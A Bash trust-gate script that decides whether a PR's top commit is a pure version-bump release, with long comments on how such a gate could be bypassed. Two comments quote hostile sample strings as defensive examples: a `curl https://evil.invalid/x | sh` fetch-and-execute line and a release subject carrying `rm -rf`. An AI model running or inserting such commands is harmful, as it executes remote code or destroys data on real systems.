#!/usr/bin/env bash
# release-anchor.sh — resolve the TRUST HEAD for /merge Phase 1.4 PATH_2.
#
# WHY THIS EXISTS (issue #364). `/goal` must guarantee a version bump before it
# lands a PR, and the serialized landing lane is the only place the next version
# is unambiguous (N parallel solvers off one base all resolve the SAME next
# version, and the duplicate change auto-merges without a conflict —
# project_uberdev_merge_version_collision). So the bump necessarily lands on the
# PR head AFTER `/review-pr` anchored the trust trail. Without this helper that
# is fatal: PATH_2 (b) reads the trailer off the most-recent commit (now the
# release commit, which has none) and PATH_2 (c) sees a non-empty cumulative
# diff over the trailer SHA (verdict STALE) — the PR can never land.
#
# WHAT IT DOES. It answers exactly one question: "is the top commit a release
# commit that provably changed NO reviewed code?" If yes, the trust head is its
# parent — (b) reads the trailer there and (c) is dispatched with that OID, so
# the trust-trail-evaluator agent is untouched and still sees an empty diff. If
# anything about the top commit is unproven, the trust head is the head itself
# and the gate behaves exactly as it did before this file existed.
#
# THE PREDICATE IS THE SECURITY BOUNDARY. A subject match alone would be a way
# to smuggle arbitrary code past the trust gate — two of the six version
# surfaces (tests/goal.test.sh, tests/solve-claim.test.sh) are executable test
# files, so a path allow-list alone is not enough either. Every one of these
# must hold:
#   1. the commit has exactly ONE parent (no merges),
#   2. its subject is exactly `chore(release): vX.Y.Z`,
#   3. its parent is NOT itself a release commit (tolerance depth is exactly 1),
#   4. its diff — enumerated with rename detection DISABLED, so a rename's
#      deleted SOURCE is in the set and not collapsed away — is non-empty and
#      touches ONLY the six version surfaces,
#   5. the canonical manifest version strictly ADVANCES, to the X.Y.Z named in
#      the subject,
#   6. every changed line outside CHANGELOG.md is a pure version-token
#      substitution — normalising SemVer tokens away, the removed and added
#      line sequences are IDENTICAL AND IN THE SAME ORDER (order matters: a
#      multiset comparison would tolerate reordering executable test lines),
#   7. CHANGELOG.md opens exactly ONE `## ` section and it is the release
#      section named in the subject; the only lines it REMOVES are release-note
#      placeholders (the `bump-version.sh` pending-notes stub, or an
#      "Unreleased" heading); and the insertion is bounded by
#      RELEASE_ANCHOR_MAX_CHANGELOG_LINES.
#
# WHY (7) NO LONGER POLICES CHANGELOG PROSE LINE BY LINE. It used to, and the
# regex it used (`## [<ver>] …` / `[-*] …` / `_…` / blank) was never a content
# control: `- curl https://evil.invalid/x | sh` satisfies the bullet arm, so a
# release commit could already write arbitrary text into CHANGELOG.md behind a
# two-byte prefix — measured, on the shipped helper, against a fixture built
# from tests/merge.test.sh M98: `RELEASE_ANCHOR=tolerated`. What the regex
# controlled was FORMATTING, and this repo's own house style (`### Changed`
# subsections, indented continuation paragraphs, tables) does not fit it.
#
# The cost, measured by running the shipped helper over all 74 `chore(release):`
# commits in this repo's history: 70 refused, and 47 of those by the CHANGELOG
# rules alone — 20 `changelog_too_large`, 18 `changelog_shape`, 8
# `changelog_deletions` (the stub and `## Unreleased` removals the ritual makes
# on purpose), and v0.56.0's `diff_too_large` at 913 diff lines against a 400
# cap, 843 of them CHANGELOG against a 40 cap. That is the entire modern era.
# The four survivors shipped NO real notes: two never touched CHANGELOG.md
# (v0.17.3, v0.23.2) and two landed with the pending-notes stub still unreplaced
# (v0.36.2, v0.36.5). It left the `/premerge` trust trail structurally
# unresolvable, because Phase 5a's whole job is replacing that stub with real
# notes: (a.5) never tolerates, so (b) reads the trailer off the trailer-less
# release commit and gate_fails `trust_trail_trailer_missing`.
#
# After: 42 of the 74 tolerated, and every remaining refusal names something a
# release commit really did. 21 `non_version_paths`, 1 `version_not_advanced`
# (v0.55.1, a re-bump to a version already shipped), 3 `changelog_deletions`
# (pre-ritual link-reference and real-note removals), and 7
# `content_not_version_only` — which includes v0.30.4, the commit this file was
# reported as falsely refusing. It is NOT a false positive: its README.md hunk
# rewrites a documentation sentence ("The seven short-form aliases …" -> "The
# eight …, `/testers`") next to the badge bump, so (6) refuses it and should.
# `changelog_shape` was merely reached first and masked the real reason.
#
# CHANGELOG.md is release notes. Nothing in this repo executes, sources or
# parses it: `bump-version.sh` and `goal-state.sh` WRITE it and no shipped code
# reads it back. Its body is inert by nature, so bounding its prose bought no
# security, and (7) now spends its budget on STRUCTURE — which asserts strictly
# more than the old regex did. The commit must open the release section it
# claims (one that appended to an OLDER section and never opened its own was
# TOLERATED before, also measured) and may open no other. The security boundary
# is, and remains, (4)+(6): the path set is confined to the six version surfaces
# with rename detection OFF, and every line of the five NON-CHANGELOG surfaces
# must be a pure version-token substitution in the same order. Renaming a file
# onto CHANGELOG.md is caught there — M98 rows 4b/4c — never here.
#
# USAGE
#   bash release-anchor.sh <head-oid-or-rev> [<working-dir>]
#
# STDOUT — KEY=VALUE lines, always including TRUST_HEAD and RELEASE_ANCHOR:
#   TRUST_HEAD=<40-hex>              the OID (b)/(c) must be evaluated against
#   RELEASE_ANCHOR=none|tolerated
#   RELEASE_ANCHOR_REASON=<slug>     why not tolerated (closed vocabulary)
#   RELEASE_ANCHOR_VERSION=<X.Y.Z>   only when tolerated
#
# EXIT — 0 when the resolution ran; 2 when the inputs are unusable (bad rev,
# not a git worktree, missing argument). Callers treat ANY non-zero exit and any
# `RELEASE_ANCHOR` value other than `tolerated` identically: no tolerance, read
# the trailer off the head itself. There is no fail-open path.

set -u

# THREE bounds, because ONE number was doing two different jobs — bounding
# inert CHANGELOG prose and bounding the code-bearing diff — and the tighter of
# those two jobs is what set the number for both.
#
# CHANGELOG.md is prose, so its bound is generous: the largest real release in
# this repo's history (v0.56.0, a `/premerge` stack landing) inserted 843 lines.
# The other two are RESOURCE bounds on the diff walk, and the code-bearing one
# is deliberately the tightest of the three: a release commit that survives step
# (4) has never needed more than 76 non-CHANGELOG diff lines (v0.22.0; the
# modern six-surface shape is 39), so 200 is ~2.6x the historical worst case and
# HALF of the single 400-line total it replaces. Splitting the cap is what lets
# the CHANGELOG half widen WITHOUT the code half widening with it — the code
# half is strictly narrower than before this file was changed.
RELEASE_ANCHOR_MAX_CHANGELOG_LINES=2000
RELEASE_ANCHOR_MAX_CODE_DIFF_LINES=200
RELEASE_ANCHOR_MAX_DIFF_LINES=4000

# The six version surfaces. SSOT is lib/bump-version.sh, which owns the edit;
# tests/merge.test.sh asserts this list has not drifted from that script.
# It was SEVEN until the Codex distribution was retired (issue #381) and
# codex/uberdev-codex/.codex-plugin/plugin.json stopped existing; the entry was
# removed here because bump-version.sh no longer owns that path, not to widen
# what a release commit may touch.
release_anchor_surfaces() {
  cat <<'SURFACES'
plugins/uberdev/.claude-plugin/plugin.json
.claude-plugin/marketplace.json
README.md
CHANGELOG.md
tests/goal.test.sh
tests/solve-claim.test.sh
SURFACES
}

RELEASE_ANCHOR_MANIFEST='plugins/uberdev/.claude-plugin/plugin.json'
RELEASE_ANCHOR_CHANGELOG='CHANGELOG.md'

# The only CHANGELOG lines a release commit may REMOVE: a release-note
# PLACEHOLDER. `bump-version.sh` inserts its pending-notes stub as an
# italic-only bullet and the release replaces it with the real notes (v0.56.0
# removed 13 of them in one landing); the older house shape promoted an
# `## Unreleased` heading into the dated section (v0.43.0, v0.52.0). Matched by
# SHAPE and not by the stub's literal wording, so re-wording the stub in
# bump-version.sh cannot silently refuse every release. Everything else stays a
# `changelog_deletions` refusal — a release commit has no business deleting a
# shipped release's notes.
RELEASE_ANCHOR_PLACEHOLDER_RE='^[-*][[:space:]]+_.*_[[:space:]]*$'
RELEASE_ANCHOR_UNRELEASED_RE='^##[[:space:]]+\[?[Uu]nreleased\]?[[:space:]]*$'

# emit <trust-head> <state> <reason> [version]
release_anchor_emit() {
  printf 'TRUST_HEAD=%s\n' "$1"
  printf 'RELEASE_ANCHOR=%s\n' "$2"
  printf 'RELEASE_ANCHOR_REASON=%s\n' "$3"
  [ -n "${4:-}" ] && printf 'RELEASE_ANCHOR_VERSION=%s\n' "$4"
  return 0
}

# release_anchor_subject_version SUBJECT -> X.Y.Z on stdout, empty when the
# subject is not exactly a release subject. Anchored at both ends on purpose:
# `chore(release): v1.2.3 and also rm -rf` must NOT match.
release_anchor_subject_version() {
  printf '%s\n' "$1" \
    | sed -n 's/^chore(release): v\([0-9][0-9]*\.[0-9][0-9]*\.[0-9][0-9]*\)$/\1/p'
}

# release_anchor_manifest_version   (manifest JSON on stdin)
release_anchor_manifest_version() {
  sed -n 's/.*"version"[[:space:]]*:[[:space:]]*"\([0-9][0-9]*\.[0-9][0-9]*\.[0-9][0-9]*\)".*/\1/p' \
    | head -n 1
}

# release_anchor_semver_gt A B -> rc 0 when A > B (numeric, field by field).
release_anchor_semver_gt() {
  local a="$1" b="$2" i av bv
  for i in 1 2 3; do
    av="$(printf '%s' "$a" | cut -d. -f"$i")"
    bv="$(printf '%s' "$b" | cut -d. -f"$i")"
    case "$av$bv" in *[!0-9]*|'') return 1 ;; esac
    [ "$(( 10#$av ))" -gt "$(( 10#$bv ))" ] && return 0
    [ "$(( 10#$av ))" -lt "$(( 10#$bv ))" ] && return 1
  done
  return 1
}

# release_anchor_hunk_lines PARENT HEAD PATH SIGN
# The +/- body lines of a single-path unified diff, with the SIGN stripped.
# Everything before the first `@@` is dropped rather than filtered by pattern:
# `--- a/x` and a removed content line `--foo` both start with `---` in a raw
# diff, so a `grep -Ev '^---'` header filter silently eats real deletions.
# `--no-renames` is a PROVEN NO-OP here (#397): the single-path pathspec already
# keeps git from pairing a rename, because the counterpart is outside it —
# output is byte-identical with and without the flag. It is present because that
# immunity is a property of the PATHSPEC, so widening or dropping the pathspec
# in a future refactor would silently reintroduce the collapse; the flag is what
# would keep this function sound if that happened.
release_anchor_hunk_lines() {
  git diff --unified=0 --no-renames "$1" "$2" -- "$3" 2>/dev/null \
    | sed -n '/^@@/,$p' \
    | grep -v '^@@' \
    | sed -n "s/^[$4]//p"
}

# release_anchor_normalize   (diff body lines on stdin)
# Collapse every SemVer token to a fixed placeholder so a pure version
# substitution normalises to the byte-identical line it replaced. Also collapses
# the BACKSLASH-ESCAPED forms (`0\.32\.0`, `0\\.32\\.0`) that the two version-lock
# test files carry inside regexes — without this they read as content changes.
release_anchor_normalize() {
  sed -E 's/[0-9]+\\*\.[0-9]+\\*\.[0-9]+/@SEMVER@/g'
}

# release_anchor_changelog_bad PARENT HEAD VER_RE
# (7) on CHANGELOG.md. Prints the refusal slug, or nothing when the edit is a
# well-formed release-notes insertion. A function rather than an arm of the
# per-path loop because it must run AFTER every other surface has been judged —
# see the call site.
release_anchor_changelog_bad() {
  local parent="$1" head="$2" ver_re="$3" chg_removed chg_added own_hdr all_hdr
  chg_removed="$(release_anchor_hunk_lines "$parent" "$head" "$RELEASE_ANCHOR_CHANGELOG" -)"
  # The `-n` guard is load-bearing: `printf '%s\n' ""` emits ONE empty line,
  # which matches neither placeholder shape, so without it an insertion-only
  # diff would report a deletion it does not contain.
  if [ -n "$chg_removed" ] \
     && printf '%s\n' "$chg_removed" \
          | grep -qEv "$RELEASE_ANCHOR_PLACEHOLDER_RE|$RELEASE_ANCHOR_UNRELEASED_RE"; then
    printf 'changelog_deletions\n'; return 0
  fi
  chg_added="$(release_anchor_hunk_lines "$parent" "$head" "$RELEASE_ANCHOR_CHANGELOG" +)"
  if [ "$(printf '%s\n' "$chg_added" | wc -l | tr -d '[:space:]')" -gt "$RELEASE_ANCHOR_MAX_CHANGELOG_LINES" ]; then
    printf 'changelog_too_large\n'; return 0
  fi
  # Exactly one `## ` section is opened, and it is this release's. BOTH halves
  # are load-bearing and NEITHER was asserted before: the own-header count
  # refuses a "release" that files its notes under someone else's section and
  # opens none of its own (measured as TOLERATED by the previous predicate), and
  # the total count refuses one that forges a SECOND release's section alongside
  # its own. `^## ` is read off raw diff lines, so a `## ` line inside a fenced
  # code block in the notes also counts — that refuses a legitimate release, and
  # refusing is the correct direction for a trust gate to be wrong in: the PR
  # simply lands the old way, whereas tolerating would waive a review. One
  # commit in 74 (v0.19.2) opened a second section; none fenced one.
  own_hdr="$(printf '%s\n' "$chg_added" | grep -cE "^## \[${ver_re}\]([[:space:]]|\$)")"
  all_hdr="$(printf '%s\n' "$chg_added" | grep -cE '^## ')"
  if [ "$own_hdr" != "1" ] || [ "$all_hdr" != "1" ]; then
    printf 'changelog_shape\n'; return 0
  fi
  return 0
}

main() {
  local head_arg="${1:-}" work_dir="${2:-.}"
  if [ -z "$head_arg" ]; then
    printf 'release-anchor: usage: release-anchor.sh <head-oid> [<working-dir>]\n' >&2
    release_anchor_emit "${head_arg:-HEAD}" none usage_error
    return 2
  fi
  if ! cd "$work_dir" 2>/dev/null; then
    release_anchor_emit "$head_arg" none working_dir_unusable
    return 2
  fi
  if ! git rev-parse --git-dir >/dev/null 2>&1; then
    release_anchor_emit "$head_arg" none not_a_git_worktree
    return 2
  fi

  local head
  if ! head="$(git rev-parse --verify --quiet "${head_arg}^{commit}" 2>/dev/null)" || [ -z "$head" ]; then
    release_anchor_emit "$head_arg" none head_not_resolvable
    return 2
  fi

  # (1) exactly one parent — a merge commit is never inert.
  local parents parent count
  parents="$(git rev-list --parents -n 1 "$head" 2>/dev/null)" || parents=""
  count="$(printf '%s\n' "$parents" | tr ' ' '\n' | grep -c '[0-9a-f]')"
  if [ "$count" != "2" ]; then
    release_anchor_emit "$head" none not_single_parent
    return 0
  fi
  parent="$(printf '%s\n' "$parents" | cut -d' ' -f2)"

  # (2) the subject is EXACTLY a release subject.
  local subject version
  subject="$(git log -1 --format=%s "$head" 2>/dev/null)"
  version="$(release_anchor_subject_version "$subject")"
  if [ -z "$version" ]; then
    release_anchor_emit "$head" none subject_not_release
    return 0
  fi

  # (3) tolerance depth is exactly 1 — a stack of release commits is not a
  # single inert commit, and chaining them would let an attacker push code in
  # commit N-2 and hide it behind two release subjects.
  if [ -n "$(release_anchor_subject_version "$(git log -1 --format=%s "$parent" 2>/dev/null)")" ]; then
    release_anchor_emit "$head" none release_commit_chain
    return 0
  fi

  # (4) the changed path set is non-empty and a SUBSET of the six surfaces.
  # `--no-renames`: rename detection is ON by default and collapses a rename to
  # its DESTINATION path only, so the deleted SOURCE reaches this set nowhere. A
  # subset test is only sound over a TOTAL set — a collapsed rename is vacuously
  # a subset, satisfied by exactly the path it omits. `git mv src/guard.sh
  # CHANGELOG.md` inside an otherwise-clean bump therefore reported six
  # surfaces, the permitted shape, and rode the trust gate with an arbitrary
  # deletion attached (#397). Same defect as #393 (lib/code_fixer_contract.py).
  local changed surfaces stray
  changed="$(git diff --name-only --no-renames "$parent" "$head" -- 2>/dev/null)"
  if [ -z "$changed" ]; then
    release_anchor_emit "$head" none empty_release_commit
    return 0
  fi
  surfaces="$(release_anchor_surfaces)"
  stray="$(printf '%s\n' "$changed" | while IFS= read -r p; do
             [ -n "$p" ] || continue
             printf '%s\n' "$surfaces" | grep -Fxq -- "$p" || printf '%s\n' "$p"
           done)"
  if [ -n "$stray" ]; then
    release_anchor_emit "$head" none non_version_paths
    return 0
  fi

  # (5) the canonical manifest version strictly ADVANCES, to the subject's
  # version. A "release" that does not move the ratchet is not a release.
  local old_ver new_ver
  old_ver="$(git show "$parent:$RELEASE_ANCHOR_MANIFEST" 2>/dev/null | release_anchor_manifest_version)"
  new_ver="$(git show "$head:$RELEASE_ANCHOR_MANIFEST" 2>/dev/null | release_anchor_manifest_version)"
  if [ -z "$old_ver" ] || [ -z "$new_ver" ]; then
    release_anchor_emit "$head" none manifest_unreadable
    return 0
  fi
  if [ "$new_ver" != "$version" ]; then
    release_anchor_emit "$head" none subject_version_mismatch
    return 0
  fi
  if ! release_anchor_semver_gt "$new_ver" "$old_ver"; then
    release_anchor_emit "$head" none version_not_advanced
    return 0
  fi

  # Bound the probe so a pathological commit cannot turn the trust gate into an
  # unbounded diff walk. Two gates here, both reporting `diff_too_large` (the
  # third bound, on inserted CHANGELOG lines, is (7)'s): the outer one is the
  # resource bound on the whole walk, and the inner one bounds the CODE-BEARING
  # half — everything except CHANGELOG.md — which is the only half where
  # tolerating volume costs anything.
  local total chg_total code_total
  total="$(git diff --unified=0 --no-renames "$parent" "$head" -- 2>/dev/null | wc -l | tr -d '[:space:]')"
  # An unreadable size is treated as OVER the bound, not under it: this is a
  # trust gate, so an unusable measurement must never widen what it tolerates.
  case "$total" in ''|*[!0-9]*) total=$(( RELEASE_ANCHOR_MAX_DIFF_LINES + 1 )) ;; esac
  if [ "$total" -gt "$RELEASE_ANCHOR_MAX_DIFF_LINES" ]; then
    release_anchor_emit "$head" none diff_too_large
    return 0
  fi
  # Subtraction, not a `:(exclude)` pathspec. BOTH probes disable rename
  # detection, so the full diff is exactly the concatenation of its per-path
  # stanzas and the difference is exact — measured on tests/merge.test.sh's M98
  # bulk-rename fixture as 1044 - 506 = 538, byte-for-byte the number the
  # exclude pathspec reports. It also keeps this bound on the two `git diff`
  # forms this file already uses: an unsupported pathspec would make git error,
  # `wc -l` report 0, and the bound FAIL OPEN, which is the one direction a
  # trust gate may never fail. An unreadable CHANGELOG size therefore counts as
  # ZERO (charging its lines to the code half, the conservative direction), and
  # a negative result counts as over.
  chg_total="$(git diff --unified=0 --no-renames "$parent" "$head" -- "$RELEASE_ANCHOR_CHANGELOG" 2>/dev/null | wc -l | tr -d '[:space:]')"
  case "$chg_total" in ''|*[!0-9]*) chg_total=0 ;; esac
  code_total=$(( total - chg_total ))
  if [ "$code_total" -lt 0 ] || [ "$code_total" -gt "$RELEASE_ANCHOR_MAX_CODE_DIFF_LINES" ]; then
    release_anchor_emit "$head" none diff_too_large
    return 0
  fi

  # (6) per-path content shape, then (7) on CHANGELOG.md. The loop variable is
  # `changed_path`, not `path`: in zsh `path` IS `$PATH`, so `local path` would
  # empty the command search path and turn the very next `git` call into
  # `command not found`.
  local changed_path removed added bad ver_re
  bad=""
  # The subject's version as an ERE literal. Built with `sed`, not
  # `${version//./\.}`, so the pattern never depends on the shell that runs this
  # file — the version has already been proven to match the anchored `X.Y.Z`
  # subject regex, so there is nothing but dots left to escape.
  ver_re="$(printf '%s' "$version" | sed 's/\./\\./g')"

  # (6) THE FIVE NON-CHANGELOG SURFACES FIRST; CHANGELOG.md is judged after the
  # loop. Order is not a security property — every path must pass, and any
  # failure refuses — but it decides WHICH refusal the caller is shown, and the
  # code-bearing verdict is the informative one. A file renamed onto
  # CHANGELOG.md fails (6) on the vanished source AND (7) on the insertion that
  # opens no release section; the reason that must surface is the one naming the
  # reviewed surface that disappeared (tests/merge.test.sh M98.rename.surface).
  while IFS= read -r changed_path; do
    [ -n "$changed_path" ] || continue
    if [ "$changed_path" = "$RELEASE_ANCHOR_CHANGELOG" ]; then continue; fi
    # (6) the removed and added line SEQUENCES must be identical once SemVer
    # tokens are normalised away. Sequence, not set: a multiset comparison would
    # let an attacker REORDER lines of tests/goal.test.sh — executable code —
    # while every individual line stayed byte-identical.
    removed="$(release_anchor_hunk_lines "$parent" "$head" "$changed_path" - | release_anchor_normalize)"
    added="$(release_anchor_hunk_lines "$parent" "$head" "$changed_path" + | release_anchor_normalize)"
    if [ "$removed" != "$added" ]; then
      bad="content_not_version_only"; break
    fi
    if [ -z "$removed" ]; then
      bad="content_not_version_only"; break
    fi
  done <<EOF
$changed
EOF

  # (7) CHANGELOG.md, only when the release commit actually touched it. When it
  # did not there is no free-text surface in the commit at all, so there is
  # nothing here to prove and the five surfaces above have already carried the
  # whole predicate.
  if [ -z "$bad" ] && printf '%s\n' "$changed" | grep -Fxq -- "$RELEASE_ANCHOR_CHANGELOG"; then
    bad="$(release_anchor_changelog_bad "$parent" "$head" "$ver_re")"
  fi

  if [ -n "$bad" ]; then
    release_anchor_emit "$head" none "$bad"
    return 0
  fi

  release_anchor_emit "$parent" tolerated inert_release_commit "$version"
  return 0
}

main "$@"
